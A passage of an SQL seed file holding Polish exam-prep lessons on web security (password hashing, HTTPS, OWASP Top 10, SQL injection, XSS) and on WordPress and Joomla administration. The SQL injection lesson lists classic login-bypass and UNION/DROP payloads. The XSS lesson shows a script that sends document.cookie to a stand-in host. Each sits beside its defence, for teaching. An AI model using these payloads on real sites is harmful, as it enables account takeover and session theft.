```php
// $hashZBazy pobrany po loginie
if (password_verify($_POST["haslo"], $hashZBazy)) {
    session_regenerate_id(true);
    $_SESSION["uzytkownik"] = $login;
} else {
    echo "Nieprawidłowy login lub hasło.";   // nie zdradzaj, które pole jest złe
}
```

`password_needs_rehash()` pozwala po zmianie algorytmu przeliczyć skrót przy najbliższym logowaniu.

## Dobre praktyki

- Kolumna na skrót: `VARCHAR(255)` — długość zależy od algorytmu.
- Wymagaj sensownej **długości** hasła (np. min. 12 znaków) zamiast skomplikowanych reguł.
- **Ogranicz liczbę prób logowania** i rozważ uwierzytelnianie dwuskładnikowe (2FA).
- Jeden komunikat dla złego loginu i złego hasła.
- Hasła wysyłaj tylko przez **HTTPS** i metodą **POST**.

## Na egzaminie

- `password_hash` przy zapisie, `password_verify` przy logowaniu.
- MD5/SHA-1 nie nadają się do haseł.
- Skrót jest jednokierunkowy; sól sprawia, że takie same hasła mają różne skróty.

## Sprawdź się

1. Dlaczego nie porównuje się `password_hash($haslo)` z wartością w bazie przez `==`?
2. Co daje sól?
3. Jaki typ i długość kolumny wybierzesz na skrót hasła?

**Odpowiedzi:** 1. Każde wywołanie losuje nową sól, więc skróty będą różne — do sprawdzenia służy `password_verify`. 2. Takie same hasła mają różne skróty, więc tablice tęczowe i porównywanie skrótów nie działają. 3. `VARCHAR(255)`.$t0$),
  ($t0$sec-https$t0$, $t0$**W skrócie:** **HTTPS** to HTTP przesyłany przez szyfrowane połączenie **TLS**. Szyfruje dane między przeglądarką a serwerem (nikt po drodze ich nie odczyta ani nie zmieni) i potwierdza **certyfikatem**, że łączysz się z prawdziwym serwerem, a nie z podszywającym się.

## Co daje TLS

| Cecha | Znaczenie |
|---|---|
| **Poufność** | dane są zaszyfrowane — w otwartym Wi-Fi nikt nie podejrzy hasła |
| **Integralność** | nikt po drodze nie podmieni treści strony (np. nie dopisze reklam ani skryptu) |
| **Uwierzytelnienie** | certyfikat potwierdza, że serwer naprawdę należy do domeny |

HTTP domyślnie działa na porcie **80**, HTTPS na **443**.

## Jak działa połączenie (w uproszczeniu)

1. Przeglądarka łączy się z serwerem i dostaje jego **certyfikat** z kluczem publicznym.
2. Sprawdza, czy certyfikat jest **ważny**, wystawiony dla tej domeny i podpisany przez zaufany **urząd certyfikacji (CA)**.
3. Strony uzgadniają wspólny **klucz sesji** (kryptografia asymetryczna służy tylko do bezpiecznego uzgodnienia).
4. Dalej dane szyfruje się szybkim szyfrem **symetrycznym** tym kluczem.

## Certyfikat

- Zawiera m.in. domenę, właściciela, klucz publiczny, okres ważności i podpis urzędu certyfikacji.
- Rodzaje według weryfikacji: **DV** (sprawdzona domena), **OV** (organizacja), **EV** (rozszerzona weryfikacja).
- **Let's Encrypt** wystawia darmowe certyfikaty DV z automatycznym odnawianiem (np. programem certbot).
- Certyfikat **samopodpisany** szyfruje, ale przeglądarka mu nie ufa — ostrzeżenie „Połączenie nie jest prywatne”. Nadaje się tylko do testów.

## Kłódka nie znaczy „bezpieczna strona”

Kłódka mówi tylko, że połączenie jest szyfrowane i domena się zgadza. Fałszywy sklep z phishingiem też może mieć HTTPS — trzeba patrzeć na **adres**.

## Wdrożenie na stronie

1. Zainstaluj certyfikat na serwerze (u hostingodawcy zwykle jednym kliknięciem).
2. **Przekieruj** cały ruch z HTTP na HTTPS (kod 301).
3. Włącz nagłówek **HSTS** (`Strict-Transport-Security`) — przeglądarka zapamięta, żeby łączyć się tylko przez HTTPS.
4. Popraw **mieszaną zawartość** (*mixed content*): obrazki i skrypty ładowane przez `http://` na stronie HTTPS przeglądarka zablokuje lub oznaczy jako niebezpieczne.
5. Ciasteczka sesji z flagą **Secure** — wysyłane tylko przez HTTPS.

## Na egzaminie

- HTTPS = HTTP + TLS, port 443.
- Certyfikat wystawia urząd certyfikacji; samopodpisany powoduje ostrzeżenie.
- Formularze z hasłem tylko przez HTTPS.

## Sprawdź się

1. Na jakim porcie domyślnie działa HTTPS?
2. Co oznacza ostrzeżenie przeglądarki przy certyfikacie samopodpisanym?
3. Czy strona z kłódką na pewno jest uczciwa?

**Odpowiedzi:** 1. 443. 2. Że certyfikatu nie podpisał zaufany urząd certyfikacji, więc nie można potwierdzić tożsamości serwera. 3. Nie — kłódka potwierdza tylko szyfrowanie i domenę, a nie uczciwość właściciela.$t0$),
  ($t0$sec-owasp$t0$, $t0$**W skrócie:** **OWASP** (Open Worldwide Application Security Project) to organizacja, która publikuje **OWASP Top 10** — listę najpoważniejszych kategorii zagrożeń aplikacji webowych. To dobra lista kontrolna: jeśli Twoja strona broni się przed tymi dziesięcioma, unikasz większości typowych błędów.

## OWASP Top 10 (wydanie 2021)

| # | Kategoria | Na czym polega | Jak się bronić |
|---|---|---|---|
| A01 | **Błędna kontrola dostępu** | użytkownik dostaje się do cudzych danych, np. zmieniając `?id=5` na `?id=6` | sprawdzaj uprawnienia **na serwerze** przy każdym żądaniu |
| A02 | **Błędy kryptograficzne** | hasła bez skrótu, brak HTTPS, słabe algorytmy | HTTPS, `password_hash`, aktualne algorytmy |
| A03 | **Wstrzykiwanie (Injection)** | SQL injection, XSS, wstrzykiwanie poleceń systemu | zapytania przygotowane, escapowanie, walidacja |
| A04 | **Niebezpieczny projekt** | brak zabezpieczeń zaplanowanych od początku, np. brak limitu prób | myśl o zagrożeniach już przy projektowaniu |
| A05 | **Błędna konfiguracja** | domyślne hasła, włączone wyświetlanie błędów, listowanie katalogów | wyłącz zbędne funkcje, zmień ustawienia domyślne |
| A06 | **Podatne i nieaktualne komponenty** | stare wtyczki, biblioteki ze znanymi lukami | aktualizacje, przegląd zależności |
| A07 | **Błędy identyfikacji i uwierzytelniania** | słabe hasła, brak limitu prób, przewidywalne sesje | limity prób, 2FA, `session_regenerate_id` |
| A08 | **Błędy integralności oprogramowania i danych** | niezweryfikowane aktualizacje, skrypty z niezaufanych źródeł | ufaj tylko zaufanym źródłom, sprawdzaj podpisy |
| A09 | **Błędy logowania i monitorowania** | nikt nie zauważa ataku | zapisuj zdarzenia (np. nieudane logowania) i przeglądaj je |
| A10 | **SSRF** | serwer pobiera adres podany przez użytkownika i trafia do sieci wewnętrznej | lista dozwolonych adresów, blokada adresów wewnętrznych |

## Przykład A01 — najczęstszy błąd

```php
// faktura.php?id=1024 — źle: każdy zalogowany zobaczy każdą fakturę
$id = (int)$_GET["id"];
$sql = "SELECT * FROM faktury WHERE id = ?";

// dobrze: faktura musi należeć do zalogowanego
$sql = "SELECT * FROM faktury WHERE id = ? AND klient_id = ?";
```

Ukrycie przycisku w interfejsie **nie jest** zabezpieczeniem — atakujący wyśle żądanie ręcznie.

## Zasady ogólne

- **Nie ufaj danym od klienta** — formularze, adres URL, ciasteczka, nagłówki można podrobić.
- **Walidacja po stronie serwera** zawsze; po stronie przeglądarki to tylko wygoda.
- **Najmniejsze uprawnienia** — konto bazy, konto użytkownika, uprawnienia do plików.
- **Obrona w głąb** — kilka warstw zabezpieczeń zamiast jednej.
- **Aktualizacje** systemu, PHP, CMS-a i wtyczek.

## Na egzaminie

- Wstrzykiwanie (Injection) obejmuje SQL injection i XSS.
- Kontrola dostępu musi być po stronie serwera.
- Wyłącz wyświetlanie błędów na produkcji (`display_errors = Off`).

## Sprawdź się

1. Do której kategorii OWASP należy pozostawienie domyślnego hasła administratora?
2. Użytkownik zmienia w adresie `profil.php?id=7` na `id=8` i widzi cudze dane. Jaki to błąd?
3. Dlaczego walidacja tylko w JavaScripcie nie wystarcza?

**Odpowiedzi:** 1. A05 — błędna konfiguracja (lub A07, jeśli chodzi o uwierzytelnianie). 2. A01 — błędna kontrola dostępu. 3. Bo żądanie można wysłać z pominięciem przeglądarki i jej skryptów.$t0$),
  ($t0$sec-sqli$t0$, $t0$**W skrócie:** **SQL injection** to atak, w którym dane wpisane przez użytkownika stają się **częścią polecenia SQL**. Dzieje się tak, gdy program skleja zapytanie z tekstu formularza. Obrona jest jedna i skuteczna: **zapytania przygotowane** (parametryzowane), w których dane nigdy nie są traktowane jak kod.

## Jak działa atak

Podatny kod logowania:

```php
$login = $_POST["login"];
$haslo = $_POST["haslo"];
$sql = "SELECT * FROM uzytkownicy WHERE login = '$login' AND haslo = '$haslo'";
$wynik = mysqli_query($polaczenie, $sql);
```

Atakujący wpisuje w pole login: `admin' -- ` (z apostrofem i spacją po myślnikach). Zapytanie robi się takie:

```sql
SELECT * FROM uzytkownicy WHERE login = 'admin' -- ' AND haslo = '...'
```

`--` rozpoczyna komentarz w SQL, więc sprawdzanie hasła **znika** — atakujący loguje się jako admin bez hasła.

Inne warianty: `' OR '1'='1` (warunek zawsze prawdziwy — zwraca wszystkie rekordy), dopisywanie `UNION SELECT` do wykradania innych tabel, a przy złej konfiguracji nawet `; DROP TABLE …`.

## Obrona: zapytania przygotowane

```php
$zap = mysqli_prepare($polaczenie,
    "SELECT id, haslo_hash FROM uzytkownicy WHERE login = ?");
mysqli_stmt_bind_param($zap, "s", $login);
mysqli_stmt_execute($zap);
$wynik = mysqli_stmt_get_result($zap);
```

1. Najpierw do bazy idzie **szablon zapytania** ze znakami `?`.
2. Osobno idą **dane** — baza wstawia je jako wartości, nigdy nie interpretuje jako SQL.
3. Typy parametrów: `s` — tekst, `i` — liczba całkowita, `d` — zmiennoprzecinkowa, `b` — dane binarne.

To samo w PDO: `$db->prepare("… WHERE login = :login")` i `execute(["login" => $login])`.

## Dodatkowe zabezpieczenia

- **Walidacja danych** — liczba ma być liczbą (`(int)`, `filter_var`), e-mail e-mailem.
- **Zasada najmniejszych uprawnień** — konto bazy, którego używa strona, nie powinno mieć prawa do `DROP` ani do innych baz.
- **Nie pokazuj błędów bazy użytkownikowi** — komunikat „You have an error in your SQL syntax…” podpowiada atakującemu budowę zapytania.
- `mysqli_real_escape_string` to stara, słabsza metoda — zapytania przygotowane są lepsze.

## Na egzaminie

- Przyczyna: sklejanie zapytania z danymi użytkownika.
- Obrona: zapytania przygotowane (`prepare` + `bind_param`).
- `' OR '1'='1` i `--` to klasyczne przykłady ataku.

## Sprawdź się

1. Dlaczego wpisanie `' OR '1'='1` w pole może zwrócić wszystkie rekordy?
2. Co oznacza `"si"` w `mysqli_stmt_bind_param`?
3. Czy ukrycie formularza przed użytkownikiem chroni przed SQL injection?

**Odpowiedzi:** 1. Bo warunek `'1'='1'` jest zawsze prawdziwy, a `OR` sprawia, że cały WHERE staje się prawdą. 2. Pierwszy parametr to tekst (string), drugi — liczba całkowita. 3. Nie — atakujący może wysłać żądanie bezpośrednio, z pominięciem formularza.$t0$),
  ($t0$sec-xss$t0$, $t0$**W skrócie:** **XSS (Cross-Site Scripting)** to wstrzyknięcie na stronę **skryptu JavaScript**, który wykona się w przeglądarkach innych użytkowników. Dzieje się tak, gdy strona wyświetla dane od użytkownika bez **escapowania**, czyli bez zamiany znaków specjalnych HTML na bezpieczne odpowiedniki.

## Jak działa atak

Księga gości wyświetla wpisy wprost:

```php
echo "<p>" . $wpis["tresc"] . "</p>";
```

Ktoś dodaje wpis:

```html
<script>fetch("https://zly.example/?c=" + document.cookie)</script>
```

Każdy, kto otworzy księgę gości, uruchomi ten skrypt — może on wykraść ciasteczka sesji, podmienić treść strony albo wysłać formularz w imieniu ofiary.

## Rodzaje XSS

| Rodzaj | Skąd pochodzi skrypt |
|---|---|
| **Trwały (stored)** | zapisany w bazie (komentarze, profile) — trafia do wszystkich odwiedzających |
| **Odbity (reflected)** | z adresu URL lub formularza, np. `szukaj.php?q=<script>…`; ofiarę trzeba namówić na kliknięcie linku |
| **DOM-based** | JavaScript na stronie sam wstawia dane do HTML, np. przez `innerHTML` |

## Obrona: escapowanie przy wypisywaniu

**PHP:**

```php
echo "<p>" . htmlspecialchars($wpis["tresc"], ENT_QUOTES, "UTF-8") . "</p>";
```

`htmlspecialchars` zamienia znaki specjalne na encje:

| Znak | Encja |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#039;` (z `ENT_QUOTES`) |

Przeglądarka wyświetli wtedy `<script>` jako **zwykły tekst**, a nie wykona go.

**JavaScript:** wstawiaj tekst przez **`textContent`**, nie `innerHTML`:

```js
element.textContent = daneOdUzytkownika;   // bezpieczne
element.innerHTML = daneOdUzytkownika;     // niebezpieczne
```

## Dodatkowe warstwy ochrony

- **Content Security Policy (CSP)** — nagłówek, który zabrania przeglądarce uruchamiać skrypty spoza zaufanych źródeł.
- Ciasteczka sesji z flagą **HttpOnly** — JavaScript nie może ich odczytać.
- Walidacja danych wejściowych (np. imię nie potrzebuje znaków `<` i `>`).
- Linki od użytkownika: dopuszczaj tylko `http:` i `https:`, nigdy `javascript:`.

Zasada: **escapuj przy wypisywaniu**, w kontekście, w którym dane trafiają na stronę (HTML, atrybut, JavaScript, URL).

## Na egzaminie

- XSS = wstrzyknięcie JavaScriptu, SQL injection = wstrzyknięcie SQL.
- Obrona w PHP: `htmlspecialchars()`; w JS: `textContent` zamiast `innerHTML`.
- `<` po escapowaniu to `&lt;`.

## Sprawdź się

1. Czym różni się XSS od SQL injection?
2. Jak zostanie zapisany znak `<` po użyciu `htmlspecialchars`?
3. Która właściwość jest bezpieczna przy wstawianiu tekstu od użytkownika w JS: `innerHTML` czy `textContent`?

**Odpowiedzi:** 1. XSS wstrzykuje skrypt wykonywany w przeglądarce ofiary, SQL injection — polecenie SQL wykonywane przez bazę. 2. `&lt;`. 3. `textContent`.$t0$),
  ($t0$cms-aktualizacje$t0$, $t0$**W skrócie:** CMS, motywy i wtyczki **trzeba aktualizować** — większość włamań na strony z WordPressem wykorzystuje znane luki w nieaktualnych wtyczkach. Przed każdą większą aktualizacją robi się **kopię zapasową** — zarówno **plików**, jak i **bazy danych**.

## Co aktualizować

| Element | Gdzie | Uwagi |
|---|---|---|
| **Rdzeń WordPressa** | Kokpit → Aktualizacje | wersje poprawkowe (np. 6.5.1 → 6.5.2) instalują się zwykle automatycznie |
| **Wtyczki** | Wtyczki | można włączyć automatyczne aktualizacje dla każdej z osobna |
| **Motywy** | Wygląd → Motywy | zmiany w motywie nadrzędnym zostaną nadpisane — stąd motyw potomny |
| **PHP i serwer** | panel hostingu | nowsza wersja PHP = szybciej i bezpieczniej; sprawdź zgodność wtyczek |

## Kopia zapasowa — dwie części

1. **Pliki** — zwłaszcza `wp-content` (motywy, wtyczki, **uploads** z mediami) i `wp-config.php`.
2. **Baza danych** — wpisy, strony, ustawienia, użytkownicy.

Bez bazy kopia plików nie odtworzy treści, a bez plików — mediów i wyglądu.

### Jak zrobić

- **Wtyczką** (np. UpdraftPlus) — automatycznie, z harmonogramem i wysyłką do chmury.
- **Ręcznie**:
  - pliki: skopiowanie katalogu strony (FTP / menedżer plików),
  - baza: **phpMyAdmin → wybierz bazę → Eksport** (format SQL) — odtwarza się ją przez **Import**.
- **Panel hostingu** — wielu dostawców robi kopie codziennie.

Kopie przechowuj **poza serwerem** strony (zasada 3-2-1) i **sprawdzaj**, czy da się z nich odtworzyć stronę.

## Bezpieczna aktualizacja — procedura

1. Zrób pełną kopię (pliki + baza).
2. Najlepiej przetestuj aktualizację na **kopii testowej** (staging) strony.
3. Aktualizuj po kolei: wtyczki → motyw → rdzeń (lub zgodnie z zaleceniami).
4. Sprawdź stronę: wygląd, formularze, logowanie, sklep.
5. Gdy coś się zepsuło — przywróć kopię albo wyłącz winną wtyczkę (np. zmieniając nazwę jej katalogu przez FTP).

## Inne dobre praktyki bezpieczeństwa

- Silne hasło administratora i login inny niż „admin”, uwierzytelnianie dwuskładnikowe.
- Usuń nieużywane wtyczki i motywy.
- Ograniczenie prób logowania.
- Tryb konserwacji podczas większych prac.
- HTTPS na całej stronie.

## Na egzaminie

- Kopia = pliki **i** baza danych.
- Eksport bazy w phpMyAdmin: zakładka **Eksport**, przywracanie: **Import**.
- Nieaktualne wtyczki to główne źródło włamań.

## Sprawdź się

1. Z jakich dwóch części składa się pełna kopia zapasowa strony na WordPressie?
2. Jak w phpMyAdmin zrobić kopię bazy danych?
3. Co zrobisz przed aktualizacją ważnej wtyczki sklepu?

**Odpowiedzi:** 1. Z plików (zwłaszcza `wp-content` i `wp-config.php`) i bazy danych. 2. Wybrać bazę → zakładka Eksport → zapisać plik SQL. 3. Zrobię pełną kopię zapasową i najlepiej sprawdzę aktualizację na kopii testowej.$t0$),
  ($t0$cms-instalacja$t0$, $t0$**W skrócie:** **CMS** (system zarządzania treścią) pozwala prowadzić stronę bez pisania kodu: treść dodaje się w panelu administracyjnym, a wygląd zapewnia motyw. **WordPress** to najpopularniejszy CMS — napisany w PHP, dane trzyma w bazie MySQL/MariaDB. Instalacja to: serwer → baza danych → pliki → kreator instalacji.

## Czego potrzebuje WordPress

- serwer WWW (Apache lub nginx) z **PHP**,
- baza **MySQL / MariaDB**,
- lokalnie wystarczy **XAMPP** (Apache + MariaDB + PHP).

## Instalacja lokalna w XAMPP — krok po kroku

1. Uruchom w panelu XAMPP moduły **Apache** i **MySQL**.
2. Wejdź na `http://localhost/phpmyadmin` i **utwórz pustą bazę**, np. `wordpress`, z kodowaniem `utf8mb4_general_ci`.
3. Pobierz WordPressa z **wordpress.org**, rozpakuj do `C:\xampp\htdocs\wordpress`.
4. Otwórz `http://localhost/wordpress` — ruszy **kreator instalacji**.
5. Podaj dane bazy:
   - nazwa bazy: `wordpress`,
   - użytkownik: `root`, hasło: puste (domyślnie w XAMPP),
   - serwer bazy: `localhost`,
   - **prefiks tabel**: domyślnie `wp_` (na prawdziwym serwerze warto zmienić).
6. Kreator zapisze ustawienia w pliku **`wp-config.php`**.
7. Podaj **nazwę witryny**, **login i hasło administratora** (nie „admin”!) oraz e-mail.
8. Zaloguj się do panelu: `http://localhost/wordpress/wp-admin`.

## Najważniejsze pliki i katalogi

| Element | Zawartość |
|---|---|
| `wp-config.php` | dane połączenia z bazą, klucze bezpieczeństwa, prefiks tabel |
| `wp-content/themes/` | motywy |
| `wp-content/plugins/` | wtyczki |
| `wp-content/uploads/` | wgrane pliki (biblioteka mediów) |
| `wp-admin/` | panel administracyjny |

Treść (wpisy, strony, ustawienia, użytkownicy) leży w **bazie danych**, a nie w plikach.

## Podstawowa konfiguracja po instalacji

- **Ustawienia → Ogólne**: tytuł witryny, opis, strefa czasowa, format daty.
- **Ustawienia → Bezpośrednie odnośniki**: ładne adresy, np. „Nazwa wpisu” (`/o-nas/` zamiast `/?p=12`).
- **Ustawienia → Czytanie**: co jest stroną główną (najnowsze wpisy czy wybrana strona).
- Usuń przykładowy wpis, stronę i komentarz.

## Na egzaminie

- WordPress = PHP + MySQL; bazę tworzy się przed instalacją.
- Dane do bazy trafiają do `wp-config.php`.
- Panel administracyjny: `/wp-admin`.

## Sprawdź się

1. Co trzeba przygotować w phpMyAdmin przed instalacją WordPressa?
2. W którym pliku zapisane są dane połączenia z bazą?
3. Gdzie zmienić adresy stron na czytelne (bez `?p=12`)?

**Odpowiedzi:** 1. Pustą bazę danych. 2. `wp-config.php`. 3. Ustawienia → Bezpośrednie odnośniki.$t0$),
  ($t0$cms-joomla$t0$, $t0$**W skrócie:** **Joomla!** to drugi popularny CMS w PHP z bazą MySQL. W porównaniu z WordPressem ma bardziej rozbudowane wbudowane funkcje (wielojęzyczność, zaawansowane uprawnienia), ale jest trudniejsza na start. Instaluje się ją podobnie: baza → pliki → kreator.

## Instalacja (XAMPP)

1. Uruchom **Apache** i **MySQL** w XAMPP.
2. W phpMyAdmin utwórz **pustą bazę**, np. `joomla`.
3. Pobierz Joomlę z **joomla.org**, rozpakuj do `htdocs/joomla`.
4. Otwórz `http://localhost/joomla` — kreator instalacji:
   - język, **nazwa witryny**,
   - **dane konta Super Użytkownika** (administratora),
   - **baza danych**: typ MySQLi, host `localhost`, użytkownik `root`, hasło puste, nazwa `joomla`, **prefiks tabel** (losowy, np. `abc12_`).
5. Po instalacji kreator może poprosić o **usunięcie katalogu `installation`** (ze względów bezpieczeństwa).
6. Konfiguracja zapisuje się w pliku **`configuration.php`**.

Panel administracyjny: **`/administrator`**.

## Podstawowe pojęcia Joomli

| Pojęcie | Co to jest | Odpowiednik w WordPressie |
|---|---|---|
| **Artykuł** | treść (tekst, obrazy) | wpis / strona |
| **Kategoria** | grupa artykułów | kategoria |
| **Menu i pozycja menu** | pozycja menu decyduje, **co** pokazać (artykuł, lista kategorii, formularz) | menu |
| **Moduł** | blok wyświetlany w **pozycji** szablonu (menu, logowanie, najnowsze artykuły) | widżet / blok |
| **Komponent** | główna aplikacja w treści strony (artykuły, kontakty, użytkownicy) | — |
| **Szablon** | wygląd witryny i administracji | motyw |
| **Rozszerzenie** | wspólna nazwa: komponenty, moduły, wtyczki, szablony, języki | wtyczka |
| **Super Użytkownik** | pełne uprawnienia | Administrator |

## Typowe zadania w panelu

- **Treść → Artykuły → Nowy** — tytuł, tekst, kategoria, stan (opublikowany / nieopublikowany).
- **Menu → Menu główne → Nowa pozycja** — typ (np. „Pojedynczy artykuł”) i wybór artykułu.
- **Treść → Moduły witryny** — przypisanie modułu do pozycji szablonu (np. `sidebar-right`).
- **System → Zarządzaj → Rozszerzenia / Instaluj rozszerzenia** — dodawanie rozszerzeń.
- **Użytkownicy** — grupy i poziomy dostępu (rejestrowani, autorzy, edytorzy, publikujący, menedżerowie, administratorzy).
- **System → Aktualizacja** — aktualizacja Joomli (po zrobieniu kopii zapasowej, np. rozszerzeniem Akeeba Backup).

## WordPress czy Joomla

| | WordPress | Joomla! |
|---|---|---|
| Łatwość na start | bardzo łatwy | trudniejsza |
| Liczba motywów i wtyczek | ogromna | mniejsza |
| Wielojęzyczność | przez wtyczkę | wbudowana |
| Uprawnienia | proste role | rozbudowane grupy i poziomy dostępu |
| Typowe użycie | blogi, strony firmowe, sklepy | portale, serwisy z wieloma grupami użytkowników |

## Na egzaminie

- Panel Joomli: `/administrator`, panel WordPressa: `/wp-admin`.
- Moduł wyświetla się w pozycji szablonu; artykuł to podstawowa treść.
- Konfiguracja Joomli: `configuration.php` (WordPress: `wp-config.php`).

## Sprawdź się

1. Pod jakim adresem jest panel administracyjny Joomli?
2. Czym w Joomli jest moduł?
3. Jak w Joomli sprawić, żeby artykuł był dostępny z menu?

**Odpowiedzi:** 1. `/administrator`. 2. Blokiem treści wyświetlanym w wybranej pozycji szablonu (np. menu w kolumnie bocznej). 3. Dodać pozycję menu typu „Pojedynczy artykuł” i wskazać ten artykuł.$t0$),
  ($t0$cms-motywy$t0$, $t0$**W skrócie:** **motyw** decyduje o **wyglądzie** strony (układ, kolory, czcionki), a **wtyczki** dodają **funkcje** (formularz kontaktowy, sklep, kopie zapasowe). Treść zostaje ta sama — zmiana motywu zmienia tylko to, jak jest pokazana.

## Motywy

- **Wygląd → Motywy → Dodaj nowy** — instalacja z oficjalnego katalogu WordPressa albo wgranie pliku ZIP.
- **Aktywny** może być tylko jeden motyw naraz.
- **Wygląd → Dostosuj** albo **Wygląd → Edytor** (motywy blokowe) — logo, kolory, czcionki, nagłówek, stopka, bez dotykania kodu.
- **Motyw potomny (child theme)** — własne zmiany CSS i szablonów robi się w motywie potomnym. Inaczej **aktualizacja motywu nadpisze Twoje poprawki**.

Dobry motyw: responsywny (RWD), aktualizowany, z dobrymi ocenami, zgodny z bieżącą wersją WordPressa, lekki.

## Wtyczki

- **Wtyczki → Dodaj nową** → wyszukaj → **Zainstaluj** → **Włącz**.
- Wtyczka zainstalowana, ale wyłączona, nie działa; usunąć można dopiero wyłączoną.

| Do czego | Przykładowe wtyczki |
|---|---|
| formularz kontaktowy | Contact Form 7, WPForms |
| SEO | Yoast SEO, Rank Math |
| sklep internetowy | WooCommerce |
| kopie zapasowe | UpdraftPlus |
| bezpieczeństwo | Wordfence |
| ochrona przed spamem | Akismet, Antispam Bee |
| optymalizacja obrazów i pamięć podręczna | Smush, WP Super Cache |
| wielojęzyczność | Polylang |

## Zasady rozsądnego korzystania

1. **Instaluj tylko potrzebne** — każda wtyczka spowalnia stronę i jest potencjalną luką.
2. Wybieraj z **oficjalnego katalogu**, aktualizowane w ostatnich miesiącach, z dobrymi ocenami i liczbą instalacji.
3. **Nigdy nie instaluj „darmowych” wersji płatnych wtyczek (nulled)** z nieznanych stron — często zawierają złośliwy kod.
4. Usuwaj nieużywane wtyczki i motywy, a nie tylko je wyłączaj.
5. Aktualizuj regularnie — po zrobieniu kopii zapasowej.

## Na egzaminie

- Motyw = wygląd, wtyczka = funkcje.
- Własne zmiany w motywie → motyw potomny.
- Wtyczkę trzeba po instalacji **włączyć**.

## Sprawdź się

1. Klient chce formularz kontaktowy na stronie. Zmieniasz motyw czy instalujesz wtyczkę?
2. Dlaczego zmian w plikach motywu nie robi się bezpośrednio w motywie nadrzędnym?
3. Czy można mieć jednocześnie włączone dwa motywy?

**Odpowiedzi:** 1. Instaluję wtyczkę (np. Contact Form 7). 2. Aktualizacja motywu nadpisze zmiany — dlatego robi się je w motywie potomnym. 3. Nie, aktywny jest tylko jeden.$t0$),
  ($t0$cms-tresci$t0$, $t0$**W skrócie:** w WordPressie treść dzieli się na **wpisy** (aktualności, ułożone od najnowszego, z kategoriami i tagami) i **strony** (stałe treści, jak „O nas” czy „Kontakt”). **Menu** prowadzi do nich użytkownika, a **role** decydują, kto co może zrobić w panelu.

## Wpisy a strony

| | Wpisy (Posts) | Strony (Pages) |
|---|---|---|
| Charakter | aktualne, pojawiają się chronologicznie | stałe, niezależne od daty |
| Przykłady | ogłoszenia, artykuły na blogu | O nas, Oferta, Kontakt, Regulamin |
| Kategorie i tagi | tak | nie |
| Hierarchia | nie | tak (strona nadrzędna i podstrony) |
| W kanale RSS | tak | nie |

**Kategorie** — główne, hierarchiczne grupy (np. „Sport”, „Wydarzenia”). **Tagi** — luźne słowa kluczowe (np. „piłka nożna”, „2026”).

## Edytor blokowy (Gutenberg)

Treść składa się z **bloków**: akapit, nagłówek, obrazek, galeria, lista, tabela, przycisk, osadzenie wideo. Blok dodaje się przyciskiem **+** albo wpisując `/` i nazwę bloku. Przed publikacją: **Podgląd**, potem **Opublikuj** (albo zaplanuj datę publikacji).

## Menu

**Wygląd → Menu** (lub **Wygląd → Edytor → Nawigacja** w motywach blokowych):
1. Utwórz menu i nadaj mu nazwę.
2. Dodaj pozycje: strony, kategorie, własne odnośniki.
3. Przeciągnij, żeby zmienić kolejność; przesunięcie w prawo tworzy **podmenu**.
4. Wybierz **położenie** (np. menu główne w nagłówku) i zapisz.

## Media

**Media → Biblioteka** — wszystkie wgrane pliki. Przy każdym obrazie uzupełnij **tekst alternatywny**.

## Role użytkowników

| Rola | Co może |
|---|---|
| **Administrator** | wszystko: ustawienia, wtyczki, motywy, użytkownicy |
| **Redaktor** (Editor) | publikować i edytować wszystkie wpisy i strony, także cudze, moderować komentarze |
| **Autor** | publikować i edytować **własne** wpisy, wgrywać pliki |
| **Współpracownik** (Contributor) | pisać własne wpisy, ale **nie publikować** (czekają na akceptację) |
| **Subskrybent** | tylko czytać i edytować własny profil |

Zasada **najmniejszych uprawnień**: osoba, która tylko pisze aktualności, dostaje rolę Autora, a nie Administratora.

**Użytkownicy → Dodaj nowego** — login, e-mail, rola.

## Na egzaminie

- Aktualności → wpisy, stałe treści → strony.
- Kategorie i tagi mają tylko wpisy.
- Współpracownik nie publikuje sam, Redaktor może edytować cudze wpisy.

## Sprawdź się

1. Gdzie dodasz stronę „Kontakt”: jako wpis czy jako stronę?
2. Jaką rolę dać uczniowi, który ma pisać artykuły, ale nauczyciel ma je zatwierdzać?
3. Jak utworzyć podmenu w edytorze menu?

**Odpowiedzi:** 1. Jako stronę. 2. Współpracownik. 3. Przeciągnąć pozycję pod inną i przesunąć ją w prawo.$t0$)
) as n(id, tresc)
join subtopics s on s.id = n.id
on conflict (subtopic_id) do nothing;
